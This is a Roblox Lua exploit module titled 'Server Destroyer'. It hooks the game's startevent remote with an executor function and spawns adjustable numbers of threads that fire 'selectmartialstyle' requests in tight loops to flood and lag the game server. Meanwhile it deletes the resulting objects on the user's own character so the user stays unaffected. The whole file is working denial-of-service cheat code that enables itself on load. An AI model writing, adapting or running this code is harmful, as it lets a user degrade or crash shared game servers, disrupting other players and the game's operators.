-- ==========================================
-- HOSHINO: SERVER DESTROYER MODULE
-- ==========================================
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

local ServerDestroyer = {}
local sd_active = false
local currentCleanup = nil
local _start, _stop, _setStrength, _getStrength, _isRunning
local fireBlocked = false
local currentToken = 0
local running = false

local function enableServerDestroyer()
    if sd_active then return end
    sd_active = true

    local alive = true
    local hookInstalled = false
    local blockConns = {}
    local strength = 3

    local function safe(fn) local ok,r=pcall(fn); if ok then return r end end

    local function newToken()
        currentToken += 1
        return currentToken
    end

    local function installFireHook()
        if hookInstalled then return end
        local remote = LocalPlayer:FindFirstChild("startevent")
        if not remote then return end
        safe(function()
            local orig = remote.FireServer
            hookfunction(orig, function(self, ...)
                if fireBlocked then return nil end
                return orig(self, ...)
            end)
            hookInstalled = true
        end)
    end

    local function nukeObj(obj)
        if not obj or not obj.Parent then return end
        safe(function()
            for _, d in ipairs(obj:GetDescendants()) do
                if d:IsA("LocalScript") or d:IsA("Script") then d.Disabled = true end
            end
            obj:Destroy()
        end)
    end

    local function shouldNuke(obj)
        local n = string.lower(obj.Name)
        return n == "airbendstaff" or n == "puppetart" or n == "windstaff"
            or n == "puppetcontrol" or n == "puppet"
    end

    local function nukeAll()
        safe(function()
            local char = LocalPlayer.Character
            if char then
                for _, c in ipairs(char:GetChildren()) do if shouldNuke(c) then nukeObj(c) end end
                for _, d in ipairs(char:GetDescendants()) do
                    if d:IsA("Attachment") then
                        local nl = string.lower(d.Name)
                        if nl == "puppetcontrol" or nl == "puppet" then safe(function() d:Destroy() end) end
                    end
                end
            end
        end)
        safe(function()
            local pp = workspace:FindFirstChild("projectileparent")
            if not pp then return end
            local pf = pp:FindFirstChild(LocalPlayer.Name.."mouse")
            if not pf then return end
            for _, c in ipairs(pf:GetChildren()) do if shouldNuke(c) then nukeObj(c) end end
        end)
    end

    local function startBlocker()
        nukeAll()
        local function hookChar(char)
            if not char then return end
            table.insert(blockConns, char.ChildAdded:Connect(function(c) if shouldNuke(c) then nukeObj(c) end end))
            table.insert(blockConns, char.DescendantAdded:Connect(function(d)
                if d:IsA("Attachment") then
                    local nl = string.lower(d.Name)
                    if nl == "puppetcontrol" or nl == "puppet" then safe(function() d:Destroy() end) end
                end
            end))
        end
        hookChar(LocalPlayer.Character)
        table.insert(blockConns, LocalPlayer.CharacterAdded:Connect(hookChar))

        safe(function()
            local pp = workspace:FindFirstChild("projectileparent")
            if not pp then return end
            local function watchFolder(pf)
                if not pf or pf.Name ~= LocalPlayer.Name.."mouse" then return end
                table.insert(blockConns, pf.ChildAdded:Connect(function(c) if shouldNuke(c) then nukeObj(c) end end))
            end
            watchFolder(pp:FindFirstChild(LocalPlayer.Name.."mouse"))
            table.insert(blockConns, pp.ChildAdded:Connect(watchFolder))
        end)

        table.insert(blockConns, RunService.Heartbeat:Connect(nukeAll))
    end

    local function stopBlocker()
        for _, c in ipairs(blockConns) do safe(function() c:Disconnect() end) end
        blockConns = {}
    end

    local function fire(toggle, myToken)
        if currentToken ~= myToken then return end
        if fireBlocked then return end
        local remote = LocalPlayer:FindFirstChild("startevent")
        local folder = ReplicatedStorage:FindFirstChild("alljutsu")
        if folder then folder = folder:FindFirstChild("FIGHTINGSTYLES") end
        if folder then folder = folder:FindFirstChild(toggle and "puppetart" or "airbending") end
        if not remote or not folder then return end
        safe(function() remote:FireServer("selectmartialstyle", folder) end)
    end

    local function megaCleaner(myToken)
        while alive and currentToken == myToken do
            nukeAll()
            task.wait(0.001)
        end
    end

    local function lagLoopP(myToken, batch, waitT)
        local toggle = math.random() > 0.5
        while alive and currentToken == myToken do
            for i = 1, batch do
                if currentToken ~= myToken then return end
                fire(toggle, myToken); toggle = not toggle
            end
            task.wait(waitT)
        end
    end

    local function stopAll()
        fireBlocked = true
        newToken()
        running = false
        task.wait(0.5)
        nukeAll()
        task.delay(1, function() fireBlocked = false end)
    end

    local function startRun()
        if running then return end
        installFireHook()
        fireBlocked = false
        running = true
        local myToken = newToken()
        local lvl = strength
        local threads = math.clamp(lvl, 1, 10)
        local batch = lvl * 5
        local waitT = (lvl >= 8) and 0.001 or (0.16 - lvl * 0.015)
        for i = 1, threads do task.spawn(function() lagLoopP(myToken, batch, waitT) end) end
        for i = 1, 10 do task.spawn(function() megaCleaner(myToken) end) end
        if lvl >= 9 then
            task.spawn(function()
                while alive and currentToken == myToken do
                    task.wait(0.5)
                    if currentToken ~= myToken then break end
                    task.spawn(function() lagLoopP(myToken, 50, 0.001) end)
                    task.spawn(function() lagLoopP(myToken, 50, 0.001) end)
                end
            end)
        end
    end

    _start = startRun
    _stop = stopAll
    _setStrength = function(n)
        n = tonumber(n)
        if n then strength = math.clamp(math.floor(n), 1, 10) end
        return strength
    end
    _getStrength = function() return strength end
    _isRunning = function() return running end

    startBlocker()

    currentCleanup = function()
        alive = false
        sd_active = false
        safe(stopAll)
        safe(stopBlocker)
        _start, _stop, _setStrength, _getStrength, _isRunning = nil, nil, nil, nil, nil
    end
end

function ServerDestroyer.SetEnabled(on)
    if on then
        enableServerDestroyer()
    else
        if currentCleanup then pcall(currentCleanup) end
        currentCleanup = nil
        sd_active = false
    end
    return true
end

function ServerDestroyer.IsRunning() if _isRunning then return _isRunning() end return false end
function ServerDestroyer.Start() if _start then _start() end end
function ServerDestroyer.Stop() if _stop then _stop() end end
function ServerDestroyer.SetStrength(n) if _setStrength then return _setStrength(n) end end
function ServerDestroyer.GetStrength() if _getStrength then return _getStrength() end return 3 end

ServerDestroyer.SetEnabled(true)
return ServerDestroyer
